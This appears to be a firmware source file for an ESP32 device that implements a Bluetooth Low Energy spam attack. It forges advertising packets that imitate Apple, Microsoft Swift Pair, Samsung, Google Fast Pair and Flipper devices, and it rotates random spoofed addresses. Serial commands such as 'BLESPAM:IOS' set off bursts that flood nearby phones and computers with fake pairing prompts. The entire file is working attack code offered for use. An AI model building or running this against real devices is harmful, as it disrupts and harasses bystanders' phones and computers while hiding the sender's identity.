#include "ble_attack.h"
#include "config.h"

#if FOX_HAS_BLE

#include "settings.h"
#include "ble_bridge.h"

#include <BLEDevice.h>
#include <string.h>

#if !FOX_BLE_NIMBLE
#include <esp_gap_ble_api.h>
#endif

namespace {
void randomBytes(uint8_t* buf, size_t len) {
  for (size_t i = 0; i < len; i++) buf[i] = (uint8_t)random(0, 256);
}

size_t appendManufacturerAd(uint8_t* buf, size_t pos, uint8_t companyLo, uint8_t companyHi,
                             const uint8_t* inner, size_t innerLen) {
  buf[pos++] = (uint8_t)(1 + 2 + innerLen);
  buf[pos++] = 0xFF;
  buf[pos++] = companyLo;
  buf[pos++] = companyHi;
  memcpy(buf + pos, inner, innerLen);
  pos += innerLen;
  return pos;
}

size_t appendServiceDataAd(uint8_t* buf, size_t pos, uint8_t uuidLo, uint8_t uuidHi,
                            const uint8_t* inner, size_t innerLen) {
  buf[pos++] = (uint8_t)(1 + 2 + innerLen);
  buf[pos++] = 0x16;
  buf[pos++] = uuidLo;
  buf[pos++] = uuidHi;
  memcpy(buf + pos, inner, innerLen);
  pos += innerLen;
  return pos;
}

size_t buildIosPacket(uint8_t* buf, int variant) {
  static const uint16_t models[] = {0x0E20, 0x0A20, 0x0F20, 0x0C20};
  uint16_t model = models[variant % (int)(sizeof(models) / sizeof(models[0]))];
  uint8_t inner[23];
  inner[0] = 0x07; inner[1] = 21;
  inner[2] = (uint8_t)(model & 0xFF);
  inner[3] = (uint8_t)(model >> 8);
  randomBytes(inner + 4, sizeof(inner) - 4);
  size_t pos = 0;
  buf[pos++] = 0x02; buf[pos++] = 0x01; buf[pos++] = 0x06;
  pos = appendManufacturerAd(buf, pos, 0x4C, 0x00, inner, sizeof(inner));
  return pos;
}

size_t buildWindowsPacket(uint8_t* buf, int variant) {
  uint8_t inner[3] = {0x03, 0x00, 0x80};
  size_t pos = 0;
  buf[pos++] = 0x02; buf[pos++] = 0x01; buf[pos++] = 0x06;
  pos = appendManufacturerAd(buf, pos, 0x06, 0x00, inner, sizeof(inner));
  const char* name = "Fox";
  buf[pos++] = (uint8_t)(1 + strlen(name));
  buf[pos++] = 0x09;
  memcpy(buf + pos, name, strlen(name));
  pos += strlen(name);
  return pos;
}

size_t buildSamsungPacket(uint8_t* buf, int variant) {
  uint8_t inner[6] = {0x01, 0x01, 0x00, 0x00, 0x00, 0x00};
  randomBytes(inner + 2, 4);
  size_t pos = 0;
  buf[pos++] = 0x02; buf[pos++] = 0x01; buf[pos++] = 0x06;
  pos = appendManufacturerAd(buf, pos, 0x75, 0x00, inner, sizeof(inner));
  return pos;
}

size_t buildFastPairPacket(uint8_t* buf, int variant) {
  uint8_t inner[3];
  randomBytes(inner, sizeof(inner));
  size_t pos = 0;
  buf[pos++] = 0x02; buf[pos++] = 0x01; buf[pos++] = 0x06;
  pos = appendServiceDataAd(buf, pos, 0x2C, 0xFE, inner, sizeof(inner));
  return pos;
}

size_t buildFlipperPacket(uint8_t* buf, int variant) {
  static const char* const names[] = {"Flipper", "Flipper Zero", "FlipperZero"};
  const char* name = names[variant % 3];
  size_t nameLen = strlen(name);
  size_t pos = 0;
  buf[pos++] = 0x02; buf[pos++] = 0x01; buf[pos++] = 0x06;
  buf[pos++] = (uint8_t)(1 + nameLen);
  buf[pos++] = 0x09;
  memcpy(buf + pos, name, nameLen);
  pos += nameLen;
  return pos;
}

void randomStaticAddress(uint8_t addr[6]) {
  for (int i = 0; i < 6; i++) addr[i] = (uint8_t)random(0, 256);
  addr[5] = (uint8_t)((addr[5] & 0x3F) | 0xC0);
}

bool refuseIfDisabled() {
  if (!FoxSettings::attacksEnabled()) {
    Serial.println("ERROR:DISABLED");
    return true;
  }
  return false;
}

#if FOX_BLE_NIMBLE
void runSpam(int mode) {
  if (!FoxBle::ensureInitialized()) { Serial.println("ERROR"); return; }

  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x40);
  pAdv->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
  pAdv->setScanResponse(false);

  uint8_t buf[31];
  int variant = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)BLESPAM_BURST_SECONDS * 1000UL) {
    int thisMode = (mode == 4) ? (variant % 5) : mode;
    size_t len;
    switch (thisMode) {
      case 0: len = buildIosPacket(buf, variant); break;
      case 1: len = buildWindowsPacket(buf, variant); break;
      case 2: len = buildSamsungPacket(buf, variant); break;
      case 5: len = buildFlipperPacket(buf, variant); break;
      default: len = buildFastPairPacket(buf, variant); break;
    }

    uint8_t addr[6];
    randomStaticAddress(addr);
    pAdv->stop();
    BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
    BLEDevice::setOwnAddr(addr);

    BLEAdvertisementData advData;
    advData.addData((char*)buf, len);
    pAdv->setAdvertisementData(advData);
    pAdv->start();

    variant++;
    delay(BLESPAM_ADV_INTERVAL_MS);
  }
  pAdv->stop();
  Serial.println("ATTACKDONE");
}

#else

void runSpam(int mode) {
  if (!FoxBle::ensureInitialized()) { Serial.println("ERROR"); return; }

  esp_ble_adv_params_t advParams = {};
  advParams.adv_int_min = 0x20;
  advParams.adv_int_max = 0x40;
  advParams.adv_type = ADV_TYPE_NONCONN_IND;
  advParams.own_addr_type = BLE_ADDR_TYPE_RANDOM;
  advParams.channel_map = ADV_CHNL_ALL;
  advParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;

  uint8_t buf[31];
  int variant = 0;
  unsigned long start = millis();
  while (millis() - start < (unsigned long)BLESPAM_BURST_SECONDS * 1000UL) {
    int thisMode = (mode == 4) ? (variant % 5) : mode;
    size_t len;
    switch (thisMode) {
      case 0: len = buildIosPacket(buf, variant); break;
      case 1: len = buildWindowsPacket(buf, variant); break;
      case 2: len = buildSamsungPacket(buf, variant); break;
      case 5: len = buildFlipperPacket(buf, variant); break;
      default: len = buildFastPairPacket(buf, variant); break;
    }

    uint8_t addr[6];
    randomStaticAddress(addr);
    esp_ble_gap_stop_advertising();
    esp_ble_gap_set_rand_addr(addr);
    esp_ble_gap_config_adv_data_raw(buf, len);
    esp_ble_gap_start_advertising(&advParams);

    variant++;
    delay(BLESPAM_ADV_INTERVAL_MS);
  }
  esp_ble_gap_stop_advertising();
  Serial.println("ATTACKDONE");
}

#endif
}

namespace FoxBleAttack {
bool handleCommand(const String& line) {
  if (!line.startsWith("BLESPAM:")) return false;

  if (refuseIfDisabled()) return true;

  String mode = line.substring(8);
  mode.trim();
  mode.toUpperCase();

  if (mode == "IOS") { runSpam(0); return true; }
  if (mode == "WINDOWS") { runSpam(1); return true; }
  if (mode == "SAMSUNG") { runSpam(2); return true; }
  if (mode == "ANDROID" || mode == "GOOGLE") { runSpam(3); return true; }
  if (mode == "ALL") { runSpam(4); return true; }
  if (mode == "FLIPPER") { runSpam(5); return true; }

  Serial.println("ERROR:BADMODE");
  return true;
}

bool scriptSpam(const String& modeArg) {
  if (!FoxSettings::attacksEnabled()) return false;
  String mode = modeArg;
  mode.toUpperCase();
  if (mode == "IOS") { runSpam(0); return true; }
  if (mode == "WINDOWS") { runSpam(1); return true; }
  if (mode == "SAMSUNG") { runSpam(2); return true; }
  if (mode == "ANDROID" || mode == "GOOGLE") { runSpam(3); return true; }
  if (mode == "ALL") { runSpam(4); return true; }
  if (mode == "FLIPPER") { runSpam(5); return true; }
  return false;
}
}

#else

namespace FoxBleAttack {
bool handleCommand(const String& line) {
  if (!line.startsWith("BLESPAM:")) return false;
  Serial.println("ERROR:Incompatible ESP32-S2 Module has no BLE");
  return true;
}

bool scriptSpam(const String&) { return false; }
}

#endif
